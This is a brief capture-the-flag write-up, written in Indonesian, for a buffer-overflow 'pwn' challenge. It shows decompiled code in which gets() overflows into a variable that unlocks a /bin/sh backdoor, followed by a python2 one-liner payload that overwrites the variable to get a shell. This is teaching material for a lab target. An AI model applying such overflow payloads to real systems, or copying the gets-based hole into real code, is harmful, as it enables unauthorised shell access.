# Bof | Pwn

## Solution
- Terdapat file ELF binary yang menerima input user menggunakan fungsi gets yang vuln buffer overflow
- Decompile dan akan terlihat:
```
  gets_0(&v5);
  if ( v6 == 0xDEADC0DE )
  {
    sub_401090(10LL);
    sub_4010A0("[*] Backdoor actived");
    sub_4010A0("[*] Access granted...");
    sub_4010B0("/bin/sh");
  }
```
- nilai buffer adalah 0x90, jadi untuk mengoverwrite nilai v6 yang ada di rsp dubutuhkan sebanyak 140 buffer
- overwrite nilai v6 menjadi 0xDEADC0DE dengan command:
```
(python2 -c 'import struct; print "A"*140 + struct.pack("I", 0xdeadc0de)'; cat -) | ./pwn
```
- Shell tereksekusi
